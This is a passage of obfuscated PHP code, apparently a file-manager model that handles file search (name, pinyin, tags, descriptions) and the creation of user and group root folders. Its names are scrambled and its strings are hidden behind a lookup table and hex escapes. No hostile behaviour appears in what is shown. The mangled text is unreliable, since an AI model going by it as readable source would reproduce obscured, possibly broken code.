$£áÇÏæÃ[2252]; $‰¼ƒ¡éÄ = $Â€ûøòº; $‹ØÅ¯È = $ş®‘Í¼Ú; $this->_listSearchBindPinyin($Â°øò, $Â€ûøòº, $ş®‘Í¼Ú); $this->alias($£áÇÏæÃ[521])->_makeOrder(); $Â€ûøòº = $this->parseWhereLike($Â€ûøòº); $úÉÅ›ôÜ = $this->distinct(!0)->field($ş®‘Í¼Ú)->where($Â€ûøòº)->selectPage($÷Ÿ÷¹Ğ©); if ($GLOBALS[$£áÇÏæÃ[6]][$£áÇÏæÃ[459]][$£áÇÏæÃ[460]] && Input::check($Â°øò[$£áÇÏæÃ[2084]], $£áÇÏæÃ[660]) && $úÉÅ›ôÜ[$£áÇÏæÃ[444]][$£áÇÏæÃ[430]] == 1 && $úÉÅ›ôÜ[$£áÇÏæÃ[444]][$£áÇÏæÃ[445]] == 0) { $úÉÅ›ôÜ = $this->distinct(!0)->field($ş®‘Í¼Ú)->where($‰¼ƒ¡éÄ)->limit(1000)->select(); $úÉÅ›ôÜ = array_page_split($úÉÅ›ôÜ, !1, $÷Ÿ÷¹Ğ©); } $this->_listSearchFileContent($úÉÅ›ôÜ, $Â°øò, $‹ØÅ¯È, $‰¼ƒ¡éÄ); $this->_listSearchDesc($úÉÅ›ôÜ, $Â°øò, $‹ØÅ¯È); $this->_listSearchTag($úÉÅ›ôÜ, $Â°øò, $‹ØÅ¯È); $this->_listSearchGroupTag($úÉÅ›ôÜ, $Â°øò, $‹ØÅ¯È); $this->_listDataApply($úÉÅ›ôÜ[$£áÇÏæÃ[447]]); $this->_listMake($úÉÅ›ôÜ); return $úÉÅ›ôÜ; } private function _listSearchFileContent(&$Œ´í»¸Á, $–±é‚“™, $…ÕÆºø, $ÎÓÂí) { $™ùôÎ±Ê =& $_SERVER[¡¬ıÜ ƒ]; if (!$–±é‚“™[$™ùôÎ±Ê[2084]] || $Œ´í»¸Á[$™ùôÎ±Ê[444]][$™ùôÎ±Ê[430]] > 1) { return; } if (!isset($ÎÓÂí[$™ùôÎ±Ê[32]]) || !is_array($–±é‚“™[$™ùôÎ±Ê[543]])) { return; } $ÎÓÂí[$™ùôÎ±Ê[543]] = array($™ùôÎ±Ê[7], $–±é‚“™[$™ùôÎ±Ê[543]]); unset($ÎÓÂí[$™ùôÎ±Ê[32]]); unset($–±é‚“™[$™ùôÎ±Ê[543]]); $±œ…Úª© = $this->field($…ÕÆºø)->where($ÎÓÂí)->limit($™ùôÎ±Ê[2253])->select(); if (!$±œ…Úª© || count($±œ…Úª©) == 0) { return; } $Œ´í»¸Á[$™ùôÎ±Ê[447]] = array_merge($±œ…Úª©, $Œ´í»¸Á[$™ùôÎ±Ê[447]]); $Œ´í»¸Á[$™ùôÎ±Ê[444]][$™ùôÎ±Ê[445]] += count($±œ…Úª©); } private function _listSearchTag(&$ìÆéíÕÚ, $ú®ˆØ™, $ŞñôéÆ©) { $ÂÉ‹Áä‡ =& $_SERVER[¡¬ıÜ ƒ]; if (!$ú®ˆØ™[$ÂÉ‹Áä‡[2084]] || $ìÆéíÕÚ[$ÂÉ‹Áä‡[444]][$ÂÉ‹Áä‡[430]] > 1) { return; } $‘‡÷š» = Model($ÂÉ‹Áä‡[2254])->listData(); $¬ŞŞ·ò = array(); $¸åæÕ–Ÿ = $ú®ˆØ™[$ÂÉ‹Áä‡[2084]]; foreach ($‘‡÷š» as $´§ô§üÑ) { $é¤•ëïÂ = $´§ô§üÑ[$ÂÉ‹Áä‡[32]]; $¹ôûÃÆƒ = str_replace($ÂÉ‹Áä‡[53], $ÂÉ‹Áä‡[12], Pinyin::get($é¤•ëïÂ)); if (stripos($é¤•ëïÂ, $¸åæÕ–Ÿ) !== !1 || stripos($¹ôûÃÆƒ, $¸åæÕ–Ÿ) !== !1) { $¬ŞŞ·ò[] = $´§ô§üÑ[$ÂÉ‹Áä‡[477]]; } } if (!$¬ŞŞ·ò) { return; } $¦°—ıÒû = array($ÂÉ‹Áä‡[502] => array($ÂÉ‹Áä‡[7], $¬ŞŞ·ò), $ÂÉ‹Áä‡[1785] => USER_ID); $ÇâäÛÛ = Model($ÂÉ‹Áä‡[504])->field($ÂÉ‹Áä‡[87])->where($¦°—ıÒû)->select(); $ÇâäÛÛ = array_to_keyvalue($ÇâäÛÛ, $ÂÉ‹Áä‡[12], $ÂÉ‹Áä‡[87]); $Ì—şùÃ¬ = array_unique($ÇâäÛÛ); $this->_listSearchMerge($ìÆéíÕÚ, $ú®ˆØ™, $ŞñôéÆ©, $Ì—şùÃ¬); } private function _listSearchDesc(&$¢à¿–’, $áğÏ¶ôÊ, $ï‘ï°¶) { $ûõœä² =& $_SERVER[¡¬ıÜ ƒ]; if (!$áğÏ¶ôÊ[$ûõœä²[2084]] || $¢à¿–’[$ûõœä²[444]][$ûõœä²[430]] > 1) { return; } $´Š¨—œè = array($ûõœä²[97] => $ûõœä²[528], $ûõœä²[452] => array($ûõœä²[461], $ûõœä²[2086] . $áğÏ¶ôÊ[$ûõœä²[2084]] . $ûõœä²[2086])); $É…ÜÂ×Ô = !1; if ($É…ÜÂ×Ô) { $­•—Ñ‹ = $this->listSearchChildren($áğÏ¶ôÊ[$ûõœä²[192]]); $­•—Ñ‹ = array_unique($­•—Ñ‹); if (!$­•—Ñ‹) { return; } $´Š¨—œè[$ûõœä²[193]] = array($ûõœä²[7], $­•—Ñ‹); } $ãÆ‰Öş« = Model($ûõœä²[637])->field($ûõœä²[193])->where($´Š¨—œè)->limit(5000)->select(); $ñ­Ù…¡Â = array_to_keyvalue($ãÆ‰Öş«, $ûõœä²[12], $ûõœä²[193]); $this->_listSearchMerge($¢à¿–’, $áğÏ¶ôÊ, $ï‘ï°¶, $ñ­Ù…¡Â); } private function _listSearchGroupTag(&$ÕØËã˜€, $‹ïÏó, $«æÕóÔ) { $è÷²–í¬ =& $_SERVER[¡¬ıÜ ƒ]; if (!$‹ïÏó[$è÷²–í¬[2084]] || $ÕØËã˜€[$è÷²–í¬[444]][$è÷²–í¬[430]] > 1 || !$‹ïÏó[$è÷²–í¬[192]]) { return; } $Ü¤½‘š = $this->sourceInfo($‹ïÏó[$è÷²–í¬[192]]); if (!$Ü¤½‘š || $Ü¤½‘š[$è÷²–í¬[190]] != SourceModel::TYPE_GROUP) { return; } $â¯Ë»öå = $Ü¤½‘š[$è÷²–í¬[571]]; $•¬†´ÀÅ = Model($è÷²–í¬[2255])->get($â¯Ë»öå); $ºÈŞä‰½ = array(); $Ÿ§¨¼¼¯ = $‹ïÏó[$è÷²–í¬[2084]]; foreach ($•¬†´ÀÅ[$è÷²–í¬[447]] as $©© é¨) { $üá™ˆÇ› = $©© é¨[$è÷²–í¬[32]]; $ÆÊĞ–Ô = str_replace($è÷²–í¬[53], $è÷²–í¬[12], Pinyin::get($üá™ˆÇ›)); if (stripos($üá™ˆÇ›, $Ÿ§¨¼¼¯) !== !1 || stripos($ÆÊĞ–Ô, $Ÿ§¨¼¼¯) !== !1) { $ºÈŞä‰½[] = $©© é¨[$è÷²–í¬[477]]; } } if (!$ºÈŞä‰½) { return; } $ŸëÅ–ú½ = array($è÷²–í¬[502] => array($è÷²–í¬[7], $ºÈŞä‰½), $è÷²–í¬[1785] => 0, $è÷²–í¬[33] => $è÷²–í¬[2106] . $â¯Ë»öå); $Ô¸ÕÊõÌ = Model($è÷²–í¬[504])->field($è÷²–í¬[87])->where($ŸëÅ–ú½)->select(); $Ô¸ÕÊõÌ = array_to_keyvalue($Ô¸ÕÊõÌ, $è÷²–í¬[12], $è÷²–í¬[87]); $«Ö¨·éá = array_unique($Ô¸ÕÊõÌ); $this->_listSearchMerge($ÕØËã˜€, $‹ïÏó, $«æÕóÔ, $«Ö¨·éá); } private function _listSearchMerge(&$”‚µ¼¹, $¢ïé“°Õ, $°©ôŠ’‹, $À±ä¿Ü) { $™¦«¸ =& $_SERVER[¡¬ıÜ ƒ]; if (!$À±ä¿Ü) { return; } $ÔïŠ”«Ğ = array_to_keyvalue($”‚µ¼¹[$™¦«¸[447]], $™¦«¸[12], $™¦«¸[193]); $¼•éî†µ = array_diff($À±ä¿Ü, $ÔïŠ”«Ğ); if (!$¼•éî†µ) { return; } $ôÄüŞº‰ = array($™¦«¸[193] => array($™¦«¸[7], $¼•éî†µ)); $‡Ú¿ÏÎü = $this->field($°©ôŠ’‹)->where($ôÄüŞº‰)->select(); if (!$‡Ú¿ÏÎü) { return; } $–¯Ã÷Œ· = array(); foreach ($‡Ú¿ÏÎü as $Å­íş•ø) { if ($this->_listSearchFilter($Å­íş•ø, $¢ïé“°Õ)) { $–¯Ã÷Œ·[] = $Å­íş•ø; } } $”‚µ¼¹[$™¦«¸[447]] = array_merge($–¯Ã÷Œ·, $”‚µ¼¹[$™¦«¸[447]]); $”‚µ¼¹[$™¦«¸[444]][$™¦«¸[445]] += count($–¯Ã÷Œ·); } private function _listSearchFilter($Çø–¢å›, $şõæò¸) { $áûö¸Ï¥ =& $_SERVER[¡¬ıÜ ƒ]; $ªé’Ç‹§ = $Çø–¢å›[$áûö¸Ï¥[487]] == $áûö¸Ï¥[91]; if (!strstr($Çø–¢å›[$áûö¸Ï¥[586]], $áûö¸Ï¥[50] . $şõæò¸[$áûö¸Ï¥[192]] . $áûö¸Ï¥[50])) { return !1; } if (isset($şõæò¸[$áûö¸Ï¥[488]]) && $şõæò¸[$áûö¸Ï¥[488]] != $áûö¸Ï¥[856]) { if ($şõæò¸[$áûö¸Ï¥[488]] == $áûö¸Ï¥[78] && !$ªé’Ç‹§) { return !1; } if ($şõæò¸[$áûö¸Ï¥[488]] != $áûö¸Ï¥[78] && $ªé’Ç‹§) { return !1; } if (!strstr($Çø–¢å›[$áûö¸Ï¥[169]], $áûö¸Ï¥[50] . $şõæò¸[$áûö¸Ï¥[488]] . $áûö¸Ï¥[50])) { return !1; } } if (isset($şõæò¸[$áûö¸Ï¥[2256]]) && $şõæò¸[$áûö¸Ï¥[2256]] < $Çø–¢å›[$áûö¸Ï¥[79]]) { return !1; } if (isset($şõæò¸[$áûö¸Ï¥[2257]]) && $şõæò¸[$áûö¸Ï¥[2257]] > $Çø–¢å›[$áûö¸Ï¥[79]]) { return !1; } if (isset($şõæò¸[$áûö¸Ï¥[667]]) && $şõæò¸[$áûö¸Ï¥[667]] != $Çø–¢å›[$áûö¸Ï¥[531]]) { return !1; } return !0; } public function listSearchChildren($èı‚–û·, $ÊÊèàúú = 5000) { $ÁÇ§É¿¹ =& $_SERVER[¡¬ıÜ ƒ]; $¿­¯ì£Ó = array(); $¿Ì¿£ıî = $this->sourceInfo($èı‚–û·); $Š«›ã = array($ÁÇ§É¿¹[586] => array($ÁÇ§É¿¹[461], $¿Ì¿£ıî[$ÁÇ§É¿¹[586]] . $¿Ì¿£ıî[$ÁÇ§É¿¹[193]] . $ÁÇ§É¿¹[618])); $¥î¢‡Æ« = $this->field($ÁÇ§É¿¹[79])->where($Š«›ã)->limit($ÊÊèàúú + 1)->select(); $›¬¿Öé = is_array($¥î¢‡Æ«) ? count($¥î¢‡Æ«) : 0; if ($›¬¿Öé > $ÊÊèàúú) { return $this->_listSearchChildrenNear($èı‚–û·, $ÊÊèàúú); } $ó÷Ùî¿ = $this->field($ÁÇ§É¿¹[193])->where($Š«›ã)->select(); $¿­¯ì£Ó = array_to_keyvalue($ó÷Ùî¿, $ÁÇ§É¿¹[12], $ÁÇ§É¿¹[193]); return $¿­¯ì£Ó; } private function _listSearchChildrenNear($œÛ³ºí¼, $çø«Àèò) { $Û‰«’Í =& $_SERVER[¡¬ıÜ ƒ]; $€ØŒ¬·† = array(); $ÓÂß§™¥ = array($Û‰«’Í[192] => $œÛ³ºí¼); $¨‰ñöú® = $this->field($Û‰«’Í[2258])->where($ÓÂß§™¥)->select(); $ç†š€±™ = array_to_keyvalue(array_filter_by_field($¨‰ñöú®, $Û‰«’Í[487], $Û‰«’Í[91]), $Û‰«’Í[12], $Û‰«’Í[193]); $€ØŒ¬·† = array_merge($€ØŒ¬·†, array_to_keyvalue($¨‰ñöú®, $Û‰«’Í[12], $Û‰«’Í[193])); if (!$ç†š€±™) { return $€ØŒ¬·†; } $ÓÂß§™¥ = array($Û‰«’Í[192] => array($Û‰«’Í[7], $ç†š€±™)); $¨‰ñöú® = $this->field($Û‰«’Í[2258])->where($ÓÂß§™¥)->limit($çø«Àèò)->select(); $€ØŒ¬·† = array_merge($€ØŒ¬·†, array_to_keyvalue($¨‰ñöú®, $Û‰«’Í[12], $Û‰«’Í[193])); $€ØŒ¬·† = array_slice($€ØŒ¬·†, 0, intval($çø«Àèò)); return $€ØŒ¬·†; } private function _listSearchBindPinyin($ºèºüÆò, &$À¨÷£, &$“ú” úš) { $¼¬³úå =& $_SERVER[¡¬ıÜ ƒ]; if (!isset($ºèºüÆò[$¼¬³úå[2084]]) || !$ºèºüÆò[$¼¬³úå[2084]]) { return; } if (!Input::check($ºèºüÆò[$¼¬³úå[2084]], $¼¬³úå[395]) || strlen($ºèºüÆò[$¼¬³úå[2084]]) < 2) { return; } $ÏÔ¨¯  = "\114\x45\106\x54\40\112\x4f\x49\x4e\40{$this->tablePrefix}\x69\157\137\163\x6f\165\162\143\x65\x5f\x6d\145\164\x61\40\155\x65\164\141\x20\x6f\156\x20\163\x6f\x75\162\x63\x65\56\x73\x6f\x75\x72\x63\145\x49\104\40\x3d\40\155\145\x74\141\56\163\157\x75\162\x63\x65\x49\x44"; $ŒöÕÒ«Ï = array(); $“ú” úš = str_replace(array($¼¬³úå[287], $¼¬³úå[53], $¼¬³úå[2259]), $¼¬³úå[12], $“ú” úš); $“ú” úš = $¼¬³úå[513] . str_replace($¼¬³úå[50], $¼¬³úå[514], $“ú” úš); $Ó¼†ª÷ = $À¨÷£[$¼¬³úå[32]]; unset($À¨÷£[$¼¬³úå[32]]); foreach ($À¨÷£ as $ø«„·¯¸ => $Åõ´ßÑ—) { $ŒöÕÒ«Ï[$¼¬³úå[513] . $ø«„·¯¸] = $Åõ´ßÑ—; } foreach ($Ó¼†ª÷ as $ƒéĞÚï…) { $ŒöÕÒ«Ï[] = array($¼¬³úå[518] => $ƒéĞÚï…, $¼¬³úå[1088] => $¼¬³úå[2088], array($¼¬³úå[2260] => $ƒéĞÚï…, $¼¬³úå[2261] => array($¼¬³úå[7], array($¼¬³úå[540], $¼¬³úå[539])))); } $this->join($ÏÔ¨¯ ); $À¨÷£ = $ŒöÕÒ«Ï; } private function _parseSearchWhere($ç¦¢£á¦) { $ÙÉ…Ş’« =& $_SERVER[¡¬ıÜ ƒ]; $ğâ¹ş­³ = array(); if (isset($ç¦¢£á¦[$ÙÉ…Ş’«[840]]) && $ç¦¢£á¦[$ÙÉ…Ş’«[840]]) { $ğâ¹ş­³[$ÙÉ…Ş’«[88]] = array($ÙÉ…Ş’«[2262], $ç¦¢£á¦[$ÙÉ…Ş’«[840]]); } if (isset($ç¦¢£á¦[$ÙÉ…Ş’«[841]]) && $ç¦¢£á¦[$ÙÉ…Ş’«[841]]) { $°š¾¨×½ = array($ÙÉ…Ş’«[2263], $ç¦¢£á¦[$ÙÉ…Ş’«[841]]); if ($ğâ¹ş­³[$ÙÉ…Ş’«[88]]) { $ğâ¹ş­³[$ÙÉ…Ş’«[88]] = array($ğâ¹ş­³[$ÙÉ…Ş’«[88]], $°š¾¨×½, $ÙÉ…Ş’«[2264]); } else { $ğâ¹ş­³[$ÙÉ…Ş’«[88]] = $°š¾¨×½; } } if (isset($ç¦¢£á¦[$ÙÉ…Ş’«[2256]]) && $ç¦¢£á¦[$ÙÉ…Ş’«[2256]] > 0) { $ğâ¹ş­³[$ÙÉ…Ş’«[79]] = array($ÙÉ…Ş’«[2262], $ç¦¢£á¦[$ÙÉ…Ş’«[2256]]); } if (isset($ç¦¢£á¦[$ÙÉ…Ş’«[2257]]) && $ç¦¢£á¦[$ÙÉ…Ş’«[2257]]) { $°š¾¨×½ = array($ÙÉ…Ş’«[2263], $ç¦¢£á¦[$ÙÉ…Ş’«[2257]]); if ($ğâ¹ş­³[$ÙÉ…Ş’«[79]]) { $ğâ¹ş­³[$ÙÉ…Ş’«[79]] = array($ğâ¹ş­³[$ÙÉ…Ş’«[79]], $°š¾¨×½, $ÙÉ…Ş’«[2264]); } else { $ğâ¹ş­³[$ÙÉ…Ş’«[79]] = $°š¾¨×½; } } if (isset($ç¦¢£á¦[$ÙÉ…Ş’«[667]]) && $ç¦¢£á¦[$ÙÉ…Ş’«[667]]) { $ğâ¹ş­³[] = array($ÙÉ…Ş’«[531] => $ç¦¢£á¦[$ÙÉ…Ş’«[667]], $ÙÉ…Ş’«[529] => $ç¦¢£á¦[$ÙÉ…Ş’«[667]], $ÙÉ…Ş’«[1088] => $ÙÉ…Ş’«[2088]); } if (isset($ç¦¢£á¦[$ÙÉ…Ş’«[488]]) && $ç¦¢£á¦[$ÙÉ…Ş’«[488]]) { $ïê«ô·â = $ç¦¢£á¦[$ÙÉ…Ş’«[488]]; if ($ïê«ô·â == $ÙÉ…Ş’«[78]) { $ğâ¹ş­³[$ÙÉ…Ş’«[487]] = 1; } else { if ($ïê«ô·â == $ÙÉ…Ş’«[2265]) { $ğâ¹ş­³[$ÙÉ…Ş’«[487]] = 0; } else { if ($ïê«ô·â) { $ïê«ô·â = is_array($ïê«ô·â) ? $ïê«ô·â : explode($ÙÉ…Ş’«[50], $ïê«ô·â); $ğâ¹ş­³[$ÙÉ…Ş’«[488]] = array($ÙÉ…Ş’«[494], $ïê«ô·â); $ğâ¹ş­³[$ÙÉ…Ş’«[487]] = 0; } } } } $this->_parseSearchParent($ç¦¢£á¦, $ğâ¹ş­³); if (isset($ç¦¢£á¦[$ÙÉ…Ş’«[2084]]) && trim($ç¦¢£á¦[$ÙÉ…Ş’«[2084]])) { $•î¼ßŠ“ = trim($ç¦¢£á¦[$ÙÉ…Ş’«[2084]]); $€™ãÃÕ÷ = explode($ÙÉ…Ş’«[53], $•î¼ßŠ“); if (strlen($•î¼ßŠ“) > 2 && (substr($•î¼ßŠ“, 0, 1) == $ÙÉ…Ş’«[121] && substr($•î¼ßŠ“, -1) == $ÙÉ…Ş’«[121]) || substr($•î¼ßŠ“, 0, 1) == $ÙÉ…Ş’«[58] && substr($•î¼ßŠ“, -1) == $ÙÉ…Ş’«[58]) { $•î¼ßŠ“ = substr($•î¼ßŠ“, 1, -1); $€™ãÃÕ÷ = array($•î¼ßŠ“); } $ğâ¹ş­³[$ÙÉ…Ş’«[32]] = array(array($ÙÉ…Ş’«[617], $ÙÉ…Ş’«[2086] . $•î¼ßŠ“ . $ÙÉ…Ş’«[2086])); if (count($€™ãÃÕ÷) > 1) { $ğâ¹ş­³[$ÙÉ…Ş’«[32]] = array(); foreach ($€™ãÃÕ÷ as $İ†øÛ‚Û) { if (!trim($İ†øÛ‚Û)) { continue; } $ğâ¹ş­³[$ÙÉ…Ş’«[32]][] = array($ÙÉ…Ş’«[617], $ÙÉ…Ş’«[2086] . trim($İ†øÛ‚Û) . $ÙÉ…Ş’«[2086]); } } } return $ğâ¹ş­³; } private function _parseSearchParent($®Óçµ‚ñ, &$À¾Ûš) { $ÖĞÓüæî =& $_SERVER[¡¬ıÜ ƒ]; if (!isset($®Óçµ‚ñ[$ÖĞÓüæî[192]]) || !$®Óçµ‚ñ[$ÖĞÓüæî[192]]) { return; } $„é§òâ… = $this->pathInfo($®Óçµ‚ñ[$ÖĞÓüæî[192]]); $Ÿá¾¬ß— = $„é§òâ…[$ÖĞÓüæî[192]] . $ÖĞÓüæî[12] === $ÖĞÓüæî[230]; $ä¦…ñ¥ = $„é§òâ…[$ÖĞÓüæî[190]] == $ÖĞÓüæî[580]; if ($„é§òâ…[$ÖĞÓüæî[596]] == $ÖĞÓüæî[597]) { $‘ÔÆıÃ = $this->sourceInfo($®Óçµ‚ñ[$ÖĞÓüæî[192]]); $„é§òâ…[$ÖĞÓüæî[586]] = $‘ÔÆıÃ[$ÖĞÓüæî[586]]; } $À¾Ûš[$ÖĞÓüæî[657]] = array($ÖĞÓüæî[617], $„é§òâ…[$ÖĞÓüæî[586]] . $®Óçµ‚ñ[$ÖĞÓüæî[192]] . $ÖĞÓüæî[618]); $ãÎÁü§ = isset($®Óçµ‚ñ[$ÖĞÓüæî[1944]]) && in_array($ÖĞÓüæî[580], $®Óçµ‚ñ[$ÖĞÓüæî[1944]]); if (!$ãÎÁü§ || !$ä¦…ñ¥ || !$Ÿá¾¬ß— || !$„é§òâ…[$ÖĞÓüæî[489]]) { return; } if (!AuthModel::authCheckRoot($„é§òâ…[$ÖĞÓüæî[489]][$ÖĞÓüæî[490]])) { return; } $ıÑıİù„ = $„é§òâ…[$ÖĞÓüæî[571]] . $ÖĞÓüæî[12]; if ($ıÑıİù„ == $ÖĞÓüæî[91]) { unset($À¾Ûš[$ÖĞÓüæî[657]]); $À¾Ûš[$ÖĞÓüæî[190]] = self::TYPE_GROUP; return; } $ÅÙå„ŠÑ = Model($ÖĞÓüæî[587])->groupChildrenAll($ıÑıİù„); $ùšĞÙã» = count($ÅÙå„ŠÑ); if ($ùšĞÙã» <= 1) { return; } $Çñœâçì = array($ÖĞÓüæî[192] => 0, $ÖĞÓüæî[190] => self::TYPE_GROUP, $ÖĞÓüæî[571] => array($ÖĞÓüæî[7], $ÅÙå„ŠÑ)); $Å–ÙŞË‹ = $this->field($ÖĞÓüæî[2266])->where($Çñœâçì)->limit($ùšĞÙã»)->select(); $À¾Ûš[$ÖĞÓüæî[657]] = array(); foreach ($Å–ÙŞË‹ as $âœ«Ê¿”) { $À¾Ûš[$ÖĞÓüæî[657]][] = array($ÖĞÓüæî[617], $ÖĞÓüæî[595] . $âœ«Ê¿”[$ÖĞÓüæî[193]] . $ÖĞÓüæî[618]); } $À¾Ûš[$ÖĞÓüæî[657]][] = $ÖĞÓüæî[2088]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Ñó¢ñßê) { $áºš×¦ =& $_SERVER[¡¬ıÜ ƒ]; $ÓùíÏëË = Model($áºš×¦[579])->where(array($áºš×¦[1776] => $Ñó¢ñßê))->find(); $§€ÃÅõñ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ñó¢ñßê, $ÓùíÏëË[$áºš×¦[32]]); $this->userDesktopAdd($§€ÃÅõñ); return $§€ÃÅõñ; } public function userDesktopAdd($ü×¥˜ƒ¿) { $ëúí  =& $_SERVER[¡¬ıÜ ƒ]; $÷Ş Ì¥ñ = LNG($ëúí [2267]); $Ò©Á“ıÇ = $this->mkdir($ü×¥˜ƒ¿, $÷Ş Ì¥ñ); $this->metaSet($Ò©Á“ıÇ, $ëúí [2268], $ëúí [91]); $this->metaSet($ü×¥˜ƒ¿, $ëúí [2269], $Ò©Á“ıÇ); } public function userPathSafeAdd($Öäôèí) { $÷ÎŒßşõ =& $_SERVER[¡¬ıÜ ƒ]; $¡ÒûŠ» = Model($÷ÎŒßşõ[579])->getInfoFull($Öäôèí); if (!$¡ÒûŠ») { return !1; } if (_get($¡ÒûŠ», $÷ÎŒßşõ[600])) { return $¡ÒûŠ»[$÷ÎŒßşõ[541]][$÷ÎŒßşõ[2270]]; } $Ç¬ÛÎâ  = $this->_mkdirRoot(SourceModel::TYPE_USER, $Öäôèí, $÷ÎŒßşõ[2271], $÷ÎŒßşõ[2272]); Model($÷ÎŒßşõ[579])->metaSet($Öäôèí, $÷ÎŒßşõ[2270], $Ç¬ÛÎâ ); $this->metaSet($Ç¬ÛÎâ , $÷ÎŒßşõ[2273], $Öäôèí); return $Ç¬ÛÎâ ; } public function userPathAppAdd($§ï²¶ò“, $Õõ«“· = '', $ÍóÅ”¥é = '') { $Ùë‹ÜÅì =& $_SERVER[¡¬ıÜ ƒ]; $Ä’®³¢Ş = Model($Ùë‹ÜÅì[579])->getInfoFull($§ï²¶ò“); if (!$Ä’®³¢Ş) { return !1; } $çÓÛ…¥º = $Ä’®³¢Ş[$Ùë‹ÜÅì[541]] ? $Ä’®³¢Ş[$Ùë‹ÜÅì[541]] : array(); $èÎòÂÎ™ = $çÓÛ…¥º[$Ùë‹ÜÅì[2274]]; if (!$èÎòÂÎ™) { $èÎòÂÎ™ = $this->_mkdirRoot(SourceModel::TYPE_USER, $§ï²¶ò“, $Ùë‹ÜÅì[2275], $Ùë‹ÜÅì[2276]); Model($Ùë‹ÜÅì[579])->metaSet($§ï²¶ò“, $Ùë‹ÜÅì[2274], $èÎòÂÎ™ . $Ùë‹ÜÅì[12]); $this->metaSet($èÎòÂÎ™, $Ùë‹ÜÅì[2274], $§ï²¶ò“); } if (!$Õõ«“·) { return $èÎòÂÎ™; } $õ­º†¶¥ = $çÓÛ…¥º[$Ùë‹ÜÅì[2277] . $Õõ«“·]; if (!$õ­º†¶¥) { $õ­º†¶¥ = $this->mkdir($èÎòÂÎ™, $Õõ«“·); Model($Ùë‹ÜÅì[579])->metaSet($§ï²¶ò“, $Ùë‹ÜÅì[2277] . $Õõ«“·, $õ­º†¶¥); $this->metaSet($õ­º†¶¥, $Ùë‹ÜÅì[2277] . $Õõ«“·, $§ï²¶ò“); } if (!$ÍóÅ”¥é) { return $õ­º†¶¥; } $€©Ô½ßÆ = $this->mkdir($õ­º†¶¥, $ÍóÅ”¥é); return $€©Ô½ßÆ; } public function groupRootAdd($ÉÛ…†„¢) { $Ù‚ûÂô» =& $_SERVER[¡¬ıÜ ƒ]; $š–ÄÊ•è = Model($Ù‚ûÂô»[587])->where(array($Ù‚ûÂô»[2078] => $ÉÛ…†„¢))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ÉÛ…†„¢, $š–ÄÊ•è[$Ù‚ûÂô»[32]]); } public function systemRootPathAdd($àèÎïåÖ) { if ($àèÎïåÖ != $_SERVER[¡¬ıÜ ƒ][610]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $àèÎïåÖ); } public function userRootRemove($¡“™Ğò) { $òåŒ¢ÃÀ = $this->targetSourceRoot(SourceModel::TYPE_USER, $¡“™Ğò, !0); foreach ($òåŒ¢ÃÀ as $­…ÀƒÃñ) { if (!$­…ÀƒÃñ) { continue; } $this->remove($­…ÀƒÃñ[$_SERVER[¡¬ıÜ ƒ][193]], !1); } } public function groupRootRemove($Ğê€Í´„) { $¡£§Óäİ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $Ğê€Í´„); if (!$¡£§Óäİ) { return; } $this->remove($¡£§Óäİ[$_SERVER[¡¬ıÜ ƒ][193]], !1); } private function _mkdirRoot($äş†©Ë, $÷¸œº±ä, $ûÅÉ‚¹¯, $Êİ¿«ªÁ = '') { $„ıÑ¥õ =& $_SERVER[¡¬ıÜ ƒ]; $Äé§œ¬ù = defined($„ıÑ¥õ[2213]) ? USER_ID : 0; $“Üí²®Ò = array($„ıÑ¥õ[479] => 0, $„ıÑ¥õ[653] => $äş†©Ë, $„ıÑ¥õ[654] => $÷¸œº±ä, $„ıÑ¥õ[651] => 1, $„ıÑ¥õ[655] => $Äé§œ¬ù, $„ıÑ¥õ[656] => $Äé§œ¬ù, $„ıÑ¥õ[652] => $Êİ¿«ªÁ, $„ıÑ¥õ[657] => $„ıÑ¥õ[595], $„ıÑ¥õ[506] => 0, $„ıÑ¥õ[622] => 0, $„ıÑ¥õ[544] => 0, $„ıÑ¥õ[658] => $„ıÑ¥õ[12]); if ($—„íàñÍ = $this->where($“Üí²®Ò)->find()) { return $—„íàñÍ[$„ıÑ¥õ[193]]; } $óÁğŞë… = "\115\x6f\x64\x65\x6c\123\157\x75\x72\143\x65\56\155\153\144\x69\162\122\157\x6f\x74\56{$äş†©Ë}\56{$÷¸œº±ä}\x2e" . $ûÅÉ‚¹¯; CacheLock::lock($óÁğŞë…); $“Üí²®Ò[$„ıÑ¥õ[32]] = $ûÅÉ‚¹¯; $ˆÃ«²óÁ = $this->add($“Üí²®Ò); $Áş¿«ğø = array($„ıÑ¥õ[659] => short_id($ˆÃ«²óÁ)); $this->where(array($„ıÑ¥õ[493] => $ˆÃ«²óÁ))->save($Áş¿«ğø); CacheLock::unlock($óÁğŞë…); return $ˆÃ«²óÁ; } private function targetSourceRoot($Äóñ, $‡”ÃûöÖ, $Ìçé¢Œ = false) { $ŞàÖ°Ğ· =& $_SERVER[¡¬ıÜ ƒ]; $è°ó¯‰š = array($ŞàÖ°Ğ·[479] => 0, $ŞàÖ°Ğ·[653] => $Äóñ, $ŞàÖ°Ğ·[654] => $‡”ÃûöÖ); if ($Ìçé¢Œ) { $¾Îœ÷Àı = $this->where($è°ó¯‰š)->select(); return $¾Îœ÷Àı ? $¾Îœ÷Àı : array(); } $Ô÷¥ÖŞİ = $this->where($è°ó¯‰š)->find(); return $Ô÷¥ÖŞİ ? $Ô÷¥ÖŞİ : array(); } public function sourceRootGroup($¦Ã‚õé) { $ïææµê =& $_SERVER[¡¬ıÜ ƒ]; if (is_string($¦Ã‚õé)) { $¦Ã‚õé = array($¦Ã‚õé); } $çé›­¤ˆ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $¦Ã‚õé, $ïææµê[222]); $§®âÃ¬â = array($ïææµê[447] => $çé›­¤ˆ, $ïææµê[444] => array($ïææµê[838] => count($¦Ã‚õé))); $this->_listDataApply($§®âÃ¬â[$ïææµê[447]]); $this->_listMake($§®âÃ¬â); return array_to_keyvalue($§®âÃ¬â[$ïææµê[85]], $ïææµê[571]); } public function mkfile($•ÇÙØ°½, $í ‘Ôİú, $óÑ³ŸÁç = '', $ô†»•ì = REPEAT_RENAME) { $°Ä¬‹°° =& $_SERVER[¡¬ıÜ ƒ]; $„Ş‡ = Model($°Ä¬‹°°[679])->addFileByContent($óÑ³ŸÁç, $í ‘Ôİú); return $this->_createFileCall($•ÇÙØ°½, $í 